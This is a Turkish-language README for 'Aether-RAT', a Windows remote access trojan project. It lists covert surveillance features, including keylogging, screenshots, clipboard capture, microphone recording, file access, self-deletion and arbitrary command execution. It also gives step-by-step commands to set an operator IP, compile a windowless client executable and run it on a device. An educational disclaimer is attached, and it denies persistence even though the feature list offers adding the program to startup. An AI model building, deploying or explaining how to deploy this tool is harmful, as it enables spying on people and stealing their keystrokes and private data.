# Aether-RAT

🌐 **Proje Web Sitesi:** [Aether-RAT Web Sitesini Ziyaret Et](https://drhakoo-beep.github.io/Aether-RAT-Website/)


<p align="center">
  <img src="logo001.png" width="220" alt="Aether RAT Logo">
</p><p align="center">
  <strong>Windows Remote Administration & Security Research</strong>
<div align="center">

[![GitHub Release](https://img.shields.io/github/v/release/drhakoo-beep/Aether-RAT?style=for-the-badge&color=cyan&logo=github&logoColor=white)](https://github.com/drhakoo-beep/Aether-RAT/releases)
[![GitHub License](https://img.shields.io/github/license/drhakoo-beep/Aether-RAT?style=for-the-badge&color=green&logo=opensourceinitiative&logoColor=white)](https://github.com/drhakoo-beep/Aether-RAT/blob/main/LICENSE)

</div>

## Hakkında

![Panel Ekran Görüntüsü](goruntuler/Screenshot_2026-10-24_06_15_24.png)

Aether RAT, Windows platformuna yönelik, eğitim ve yetkilendirilmiş güvenlik araştırmaları amacıyla geliştirilen deneysel bir uzaktan yönetim projesidir.

Proje henüz geliştirme aşamasındadır. Teknik ayrıntılar, dokümantasyon ve geliştirme sürecine ilişkin güncellemeler ilerleyen aşamalarda paylaşılacaktır.


[▶ KURULUM VİDEOSUNU İZLE](https://files.catbox.moe/f3ob01.mp4)


## Özellikler

- 5 saniye ortam dinlemek (TEST EDİLMEDİ)
- Anlık ekran görüntüsü
- Pano geçmişini görüntüle
- Klavye girdi günlüğü
- Anlık süreç ağacı
- Kendisini silmek
- Dışardan harici dosyalar indirmek (TEST EDİLMEDİ)
- Dosya yöneticisi
- Özel komut girmek (Örn. programı yeniden başlatmalara eklemek vb.)

## Kurulum

```bash
git clone https://github.com/drhakoo-beep/Aether-RAT

cd Aether-RAT

python -m venv venv

source venv/bin/activate

pip install fastapi uvicorn python-multipart jinja2 --break-system-packages
```

Daha sonra

```bash
nano program.cs
```

Komutundan sonra kod içindeki "SİZİN_İP_ADRESİNİZ" yazan yere IP adresinizi yazın. (Örn: 192.168.0.16)

## Çalıştırma

```bash
python main.py
```

Şimdi tarayıcınızdan localhost:8080 adresine gidiniz.

Panel açıldıktan sonra, program.cs dosyanızı .exe formatında derleyiniz. 


(Windows) içinde derleme komutu;

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:winexe /r:System.Drawing.dll,System.Windows.Forms.dll program.cs
```

(Linux) içinde derleme komutu;

```bash
sudo apt install mono-complete -y

cd /dosyanin/oldugu/dizin

mcs -target:winexe -r:System.Drawing.dll,System.Windows.Forms.dll program.cs
```

Derlendikten sonra sanal makinanıza veya izinli olduğunuz cihazlara flaşbellek vb. yöntemlerle indirin, .exe programına çift tıklayın ve artık hazırsınız.

Panelde sayfayı yenileyin ve cihaz isminin göründüğünü görebilirsiniz, üstüne tıklayın.

-Tebrikler! Artık hazırsınız

## Projenin Amacı

- Windows sistemlerinin uzaktan yönetim mimarisini incelemek
- Güvenlik araştırmaları için teknik deneyim kazanmak
- Kontrollü ve izinli test ortamlarında çalışma yapmak


## Sorumluluk Bildirimi

Bu proje eğitim ve yetkilendirilmiş güvenlik araştırmaları için tasarlanmaktadır. İzinsiz erişim, gözetim veya başkalarının verilerinin ele geçirilmesi amacıyla kullanılmamalıdır. Programda başlatmalara ekleme, kalıcılık yöntemleri, antivirüs yazılımlarını atlatma gibi amaçlar bulunmamaktadır, tüm sorumluluk kullanan kullanıcıya aittir. Bu yazılımı kullanarak, sorumluluk bildirimini kabul etmiş olursunuz.


## İletişim

drhako42@gmail.com
gokaltinhakan68@gmail.com

*Geliştirme*

Proje geliştikçe yeni bilgiler ve teknik belgeler bu depo üzerinden paylaşılacaktır.

23 Ekim -> Temel C# kodu hazırlandı, web arayüzü tamamlanıyor.

24 Ekim -> İlk sürüm yayınlandı.
---

<p align="center">
  <i>Aether RAT — Geliştirme devam ediyor.</i>
</p>
